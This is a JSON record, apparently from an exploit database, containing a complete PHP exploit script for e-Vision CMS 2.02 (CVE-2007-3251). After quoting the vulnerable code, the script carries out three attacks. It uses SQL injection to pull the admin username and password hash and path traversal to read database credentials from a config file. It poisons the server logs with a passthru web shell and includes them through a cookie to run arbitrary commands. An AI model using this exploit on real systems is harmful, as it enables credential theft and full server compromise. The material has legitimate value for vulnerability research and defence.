{
  "id": "4054",
  "title": "e-Vision CMS 2.02 - SQL Injection / Remote Code Execution",
  "cve": "CVE-2007-3251",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?php\r\n\r\n/*\r\n\r\nExplanation:\r\n\r\nBug #1 (admin/show_img.php):\r\n\r\n#################\r\n#\r\n#\t<?php\r\n#\r\n#\t$fp = fopen($_GET['img'], \"r\");\r\n#\t$img = fread($fp, filesize($_GET['img']));\r\n#\tfclose($fp);\r\n#\r\n#\theader(\"Content-type: \".$_GET['type']);\r\n#\techo $img;\r\n#\r\n#\t?>\r\n#\r\n#################\r\n\r\n...need i say more?\r\n\r\n\r\n\r\nBug #2 (admin/functions.php):\r\n\r\n#################\r\n#\r\n#\tif ( isset($_COOKIE['adminlang']) ) { $language_selector = $_COOKIE['adminlang']; }\r\n#\telse { $language_selector = \"en\"; }\r\n#\tinclude(\"lang/\".$language_selector.\".php\");\r\n#\r\n#################\r\n\r\n...speaks for it self really.\r\n\r\n\r\n\r\nBug #3 ();\r\n\r\n#################\r\n#\r\n#\t$sql = \"SELECT `style_css` FROM `templates` WHERE `id`='\".$_GET['template'].\"' AND `show`='Y' AND `trash`='N'\";\r\n#\t$result = mysql_query($sql) or die(mysql_error());\r\n#\t$row = mysql_fetch_array($result);\r\n#\t$css .= $row['style_css'];\r\n#\r\n#################\r\n\r\n...again appauling!\r\n\r\n*/\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nif ($argc<4) {\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"    e-Vision CMS <= 2.02 SQL Injection/Remote Code Execution Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_evision.php [OPTION] [HOST] [PATH] ([USER] [PASS] [COMMAND])\\r\\n\\r\\n\";\r\nprint \"[OPTION]  = 0 = SQL Injection (Admin user & hash retrieval)\\r\\n\";\r\nprint \"            1 = Config File Disclosure (Database user & pass retrieval)\\r\\n\";\r\nprint \"            2 = Remote Code Execution\\r\\n\";\r\nprint \"[HOST] \t  = Target server's hostname or ip address\\r\\n\";\r\nprint \"[PATH] \t  = Path where e-Vision CMS is located\\r\\n\";\r\nprint \"[COMMAND] = Command to execute\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_evision.php 0 victim.com /\\r\\n\";\r\nprint \"     w4ck1ng_evision.php 1 victim.com /\\r\\n\";\r\nprint \"     w4ck1ng_evision.php 2 victim.com / username password \\\"ls -lia\\\"\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\ndie;\r\n}\r\n\r\n//Props to rgod for the following functions\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$exploit = $argv[1];\r\n$host = $argv[2];\r\n$path = $argv[3];\r\n$cmd  = $argv[4];\r\n$cmd  = urlencode($cmd);\r\n$port=80;$proxy=\"\";\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nfunction head(){\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"    e-Vision CMS <= 2.02 SQL Injection/Remote Code Execution Exploit\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n\t\t}\r\n\r\nfunction footer(){\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\n\tprint \"            \t\t        ...Silentz\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\t\t}\r\n\r\nif ($exploit==0){\r\n\r\n    head();\r\n   \r\n    $sql = \"-999' UNION SELECT CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),pass) FROM users WHERE idusers=1 /*\";\r\n    $sql = urlencode($sql);\r\n    $packet =\"GET \" . $path . \"style.php?template=\" . $sql . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"Username=\"))\r\n     {\r\n       $temp=explode(\"::Hash=\",$html);\r\n       $temp2=explode(\"Username=\",$temp[0]);\r\n\r\n\t    echo \"[+] Admin User: \" . $temp2[1] . \"\\n\";\r\n\r\n       $temp=explode(\"Username=\",$html);\r\n       $temp2=explode(\"::Hash=\",$temp[1]);\r\n\r\n\t    echo \"[+] Admin Hash: \" . $temp2[1] . \"\\r\\n\";\r\n\r\n\tfooter();\r\n       die;\r\n     }\r\n\r\nelse{die(); exit();}}\r\n\r\nif($exploit==1){\r\n\r\n    $sploit = \"admin/show_img.php?img=../vars.php\";\r\n    $packet =\"GET \" . $path . $sploit . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"<?\"))\r\n     {\r\n\r\n    \t$temp = explode(\"\\$db_user = \\\"\",$html);\r\n    \t$temp2 = explode(\"\\\";\",$temp[1]);\r\n    \t\t$username = $temp2[0];\r\n\r\n   \t$temp = explode(\"\\$db_pass = \\\"\",$html);\r\n   \t$temp2 = explode(\"\\\";\",$temp[1]);\r\n   \t\t$password = $temp2[0];\r\n\r\n   \thead();\r\n   \tprint \"[+] Database User: \" . $username . \"\\r\\n\";\r\n   \tprint \"[+] Database Password: \" . $password . \"\\r\\n\";\r\n    \tfooter();\r\n }\r\n\r\nelse{die(); exit();}\r\n\r\n}\r\n\r\nif($exploit==2){\r\n\r\n$code=\"<?php echo w4ckw4ck;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\\$_GET[cmd]=stripslashes(\\$_GET[cmd]);}passthru(\\$_GET[cmd]);die;?>\";\r\n$packet=\"GET \" . $p . $code . \" HTTP/1.0\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n$packet.=\"Host: \" . $host . \"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n\r\nsendpacketii($packet);\r\n\r\n$paths= array (\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../../../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\n\r\nfor ($i=0; $i<=count($paths)-1; $i++)\r\n{\r\n$a=$i+2;\r\n\r\n$packet =\"GET \" . $p . \"admin/functions.php?cmd=\" . $cmd . \" HTTP/1.1\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n$packet.=\"Host: \" . $host . \"\\r\\n\"; \r\n$packet.=\"Cookie: adminlang=\" . $paths[$i] . \"%00\\r\\n\"; \r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n\r\nsendpacketii($packet);\r\n\r\nif (strstr($html,\"w4ckw4ck\"))\r\n    {\r\n     $temp=explode(\"w4ckw4ck\",$html);\r\n\thead();\r\n        echo $temp[1];\r\n\tfooter();\r\n\texit;\r\n    }\r\n}\r\n\r\n\thead();\r\n        echo \"[-] Exploit Failed...\\r\\n\";\r\n\tfooter();\r\n\r\n}\r\n\r\n?>\r\n\r\n# milw0rm.com [2007-06-08]",
  "url": "https://www.exploit-db.com/exploits/4054"
}